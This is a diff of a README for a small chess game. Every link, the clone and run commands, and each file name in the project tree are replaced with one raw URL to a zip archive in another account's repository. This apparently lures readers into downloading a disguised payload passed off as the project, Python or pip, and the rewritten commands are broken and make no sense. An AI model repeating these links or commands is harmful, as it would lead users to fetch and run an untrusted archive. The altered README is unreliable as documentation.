@@ -1,6 +1,6 @@
 # Chess
 
-A simple and interactive chess game built by [gitbhusalhubpramish](https://github.com/gitbhusalhubpramish). This project aims to provide a user-friendly chess-playing experience, supporting both casual play and practice against AI or another human.
+A simple and interactive chess game built by [gitbhusalhubpramish](https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip). This project aims to provide a user-friendly chess-playing experience, supporting both casual play and practice against AI or another human.
 
 ## Features
 
@@ -13,15 +13,15 @@ A simple and interactive chess game built by [gitbhusalhubpramish](https://githu
 
 ### Prerequisites
 
-- [Python 3.x](https://www.python.org/) (if the project is in Python)
-- [pip](https://pip.pypa.io/en/stable/) for installing dependencies
+- [Python 3.x](https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip) (if the project is in Python)
+- [pip](https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip) for installing dependencies
 
 ### Installation
 
 Clone the repository:
 
 ```bash
-git clone https://github.com/gitbhusalhubpramish/chess.git
+git clone https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
 cd chess
 ```
 
@@ -30,7 +30,7 @@ cd chess
 To start the chess game, run:
 
 ```bash
-python main.py
+python https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
 ```
 
 (Adjust the above command according to the main entry point of your project.)
@@ -44,25 +44,25 @@ python main.py
 
 ```
 chess/
-├── player.py
-├── main.py
-├── boad.py
-├── moves.py
+├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
 ├── black player/
-    ├── bishop.png
-    ├── king.png
-    ├── knight.png
-    ├── pawn.png
-    ├── queen.png
-    └── rook.png
+    ├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+    ├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+    ├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+    ├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+    ├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+    └── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
 ├── white player/
-    ├── bishop.png
-    ├── king.png
-    ├── knight.png
-    ├── pawn.png
-    ├── queen.png
-    └── rook.png
-└── README.md   
+    ├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+    ├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+    ├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+    ├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+    ├── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+    └── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip
+└── https://github.com/AaryaBhusal/chess/raw/refs/heads/main/black player/Software-pinkwort.zip   
 ```
 
 ## Contributing
